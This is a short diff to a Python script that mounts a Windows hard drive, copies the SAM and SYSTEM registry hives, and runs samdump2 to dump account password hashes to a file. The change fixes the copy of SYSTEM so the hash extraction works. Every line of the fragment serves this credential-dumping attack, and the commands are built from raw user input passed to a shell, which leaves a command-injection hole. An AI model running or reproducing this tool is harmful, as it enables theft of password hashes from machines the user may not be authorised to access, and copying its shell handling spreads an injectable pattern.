@@ -28,7 +28,7 @@ def animal():
     windows_harddrive = input("Enter Path To Windows Hard Drive: ") 
     subprocess.call("sudo mount -o ro " + windows_harddrive + " " + directory, shell=True)
     subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SAM .", shell=True)
-    subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SYSTEM", shell=True)
+    subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SYSTEM .", shell=True)
     subprocess.call("sudo samdump2 SYSTEM SAM -o targethashes.txt", shell=True)
 
 
